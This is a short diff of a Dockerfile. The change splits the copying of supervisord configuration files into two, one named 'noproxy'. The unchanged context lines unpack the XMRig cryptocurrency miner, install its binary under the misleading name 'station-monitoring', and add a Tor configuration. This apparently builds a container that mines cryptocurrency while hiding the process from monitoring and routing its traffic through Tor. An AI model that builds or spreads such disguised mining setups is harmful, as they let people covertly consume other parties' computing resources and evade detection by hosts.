@@ -17,7 +17,8 @@ RUN tar -xvf xmrig-${XMRIG_VERSION}-linux-x64.tar.gz
 RUN ls -al xmrig-${XMRIG_VERSION}
 RUN cp xmrig-${XMRIG_VERSION}/xmrig /usr/bin/station-monitoring
 
-COPY supervisord*.conf /etc/supervisor/conf.d/supervisord.conf
+COPY supervisord.conf /etc/supervisor/conf.d/supervisord.conf
+COPY supervisord-noproxy.conf /etc/supervisor/conf.d/supervisord-noproxy.conf
 COPY tor.rc /etc/tor/tor.rc
 COPY scripts/*.bash /scripts/
 COPY config.json /data/
